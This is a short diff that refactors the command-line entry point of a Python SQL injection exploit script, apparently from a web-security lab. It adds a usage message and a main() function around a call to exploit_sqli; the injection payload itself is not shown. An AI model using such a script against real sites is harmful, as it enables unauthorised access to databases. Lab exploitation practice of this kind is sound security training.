@@ -40,12 +40,22 @@ def exploit_sqli(s, url):
         return False
 
 
-if __name__ == '__main__':
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"(+) Usage: {sys.argv[0]} <url>")
+        print(f"(+) Example: {sys.argv[0]} https://target.com/")
+        sys.exit(-1)
+
     url = sys.argv[1]
-    
     # Session is needed because we do 2 requests: GET and POST
     s = requests.Session()
     if exploit_sqli(s, url):
         print("(+) SQL injection successed")
     else:
         print("(-) SQL injection failed")
+
+if __name__ == "__main__":
+    main()
+    
+    
